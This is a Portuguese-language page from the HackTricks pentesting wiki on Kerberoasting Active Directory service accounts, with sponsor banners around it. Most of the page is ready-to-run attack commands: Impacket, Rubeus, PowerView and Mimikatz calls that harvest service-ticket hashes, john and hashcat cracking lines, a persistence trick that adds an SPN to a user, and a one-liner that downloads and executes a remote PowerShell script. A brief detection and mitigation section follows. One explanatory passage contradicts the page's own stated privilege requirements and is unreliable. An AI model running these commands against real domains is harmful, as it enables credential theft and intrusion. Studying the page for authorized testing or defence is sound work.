# Kerberoast

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Kerberoast

O objetivo do **Kerberoasting** é coletar **tickets TGS para serviços que são executados em nome de contas de usuário** no AD, não em contas de computador. Assim, **parte** desses tickets TGS são **criptografados** com **chaves** derivadas das senhas dos usuários. Como consequência, suas credenciais podem ser **quebradas offline**.\
Você pode saber que uma **conta de usuário** está sendo usada como um **serviço** porque a propriedade **"ServicePrincipalName"** não é nula.

Portanto, para realizar o Kerberoasting, apenas uma conta de domínio que possa solicitar TGSs é necessária, o que pode ser qualquer pessoa, pois não são necessários privilégios especiais.

**Você precisa de credenciais válidas dentro do domínio.**

### **Ataque**

{% hint style="warning" %}
As ferramentas de **Kerberoasting** normalmente solicitam **`criptografia RC4`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque o RC4 é [**mais fraco**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) e mais fácil de quebrar offline usando ferramentas como o Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto os AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Ferramentas multifuncionais incluindo um despejo de usuários kerberoastáveis:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerar usuários vulneráveis ao ataque Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar TGS e extrair da memória**

Nesta técnica, o objetivo é solicitar um Service Ticket (TGS) para um serviço específico e, em seguida, extrair esse ticket da memória do sistema. O TGS contém a chave de criptografia do serviço, que pode ser usada para realizar ataques de descriptografia offline. 

Para realizar essa técnica, siga as etapas abaixo:

1. Identifique o serviço alvo: Determine qual serviço você deseja atacar e obter o TGS correspondente. Isso pode ser feito por meio de análise de rede ou pesquisa de informações.

2. Solicite o TGS: Use uma ferramenta como o "Rubeus" para solicitar o TGS para o serviço alvo. Isso pode ser feito usando o comando `Rubeus asktgs /service:<service_name> /user:<username> /domain:<domain_name>`.

3. Extraia o TGS da memória: Use uma ferramenta como o "Mimikatz" para extrair o TGS da memória do sistema. Isso pode ser feito usando o comando `Mimikatz sekurlsa::tickets /export`.

4. Descriptografe o TGS: Use uma ferramenta como o "Hashcat" para realizar ataques de descriptografia offline no TGS extraído. Isso pode ser feito usando o comando `hashcat -m 13100 <tgs_file> <wordlist>`.

Lembre-se de que essa técnica requer acesso privilegiado ao sistema alvo e pode ser detectada por soluções de segurança. Portanto, é importante realizar essa técnica com cuidado e apenas em um ambiente controlado e autorizado.
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Ferramentas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Quando um TGS é solicitado, o evento do Windows `4769 - Um ticket de serviço Kerberos foi solicitado` é gerado.
{% endhint %}



![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, utilizando as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Quebrando
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistência

Se você tiver **permissões suficientes** sobre um usuário, você pode torná-lo **susceptível a ataques de kerberoasting**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Você pode encontrar ferramentas úteis para ataques de **kerberoast** aqui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se você encontrar esse **erro** no Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, é por causa do horário local, você precisa sincronizar o host com o DC. Existem algumas opções:
- `ntpdate <IP do DC>` - Descontinuado a partir do Ubuntu 16.04
- `rdate -n <IP do DC>`

### Mitigação

O kerberoast é muito furtivo se for explorável

* Security Event ID 4769 - Um ticket Kerberos foi solicitado
* Como o 4769 é muito frequente, vamos filtrar os resultados:
* O nome do serviço não deve ser krbtgt
* O nome do serviço não deve terminar com $ (para filtrar contas de máquina usadas para serviços)
* O nome da conta não deve ser machine@domain (para filtrar solicitações de máquinas)
* O código de falha é '0x0' (para filtrar falhas, 0x0 é sucesso)
* Mais importante, o tipo de criptografia do ticket é 0x17
* Mitigação:
* As senhas da conta de serviço devem ser difíceis de adivinhar (mais de 25 caracteres)
* Use Contas de Serviço Gerenciadas (Mudança automática de senha periodicamente e gerenciamento delegado de SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
**Mais informações sobre Kerberoasting em ired.team** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**e** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
